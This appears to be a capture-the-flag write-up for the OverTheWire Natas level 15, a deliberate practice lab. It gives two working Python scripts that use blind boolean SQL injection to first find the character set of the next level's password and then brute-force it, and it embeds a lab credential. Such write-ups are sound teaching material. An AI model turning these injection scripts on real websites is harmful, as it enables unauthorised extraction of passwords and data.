# Level 15 -> 16  

Blind SQLI  

we use the boolean response of whether the user exists or not to figure out the password for level 16  

use this script to find charset of the password (i.e. set of characters which make up the password)  

```python
import requests

target = "http://natas15.natas.labs.overthewire.org"
charset_0 = "0123456789" + "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
charset_1 = ""

for c in charset_0:
        username = ('natas16" AND password LIKE BINARY "%' + c + '%" "')
        r = requests.get(target,
                        auth= ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"),
                        params={"username": username}
        )
        if "This user exists" in r.text:
                charset_1 += c
                print("CSET: " + charset_1.ljust(len(charset_0), "*"))
```

this works because of this query  

```
natas16" AND password LIKE BINARY "%c%" "
```

Here %c% indicates anything before or after **c**, whether **c** exists in string  
Here **BINARY** ensures case sensitive comparison  

Find password using bruteforce of charset characters using the script below  

```python
import requests

target = "http://natas15.natas.labs.overthewire.org"
charset = "346cefhijkmostuvDEGKLMPQVWXY"
password = ""

for i in range(0, 32):
        for c in charset:
                t = password + c
                username = ('natas16" AND password LIKE BINARY "' + t + '%" "')
                r = requests.get(target,
                                auth= ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"),
                                params={"username": username}
                )
                if "This user exists" in r.text:
                        password = t
                        print("Password: " + password.ljust(32, "*"))
                        break
```

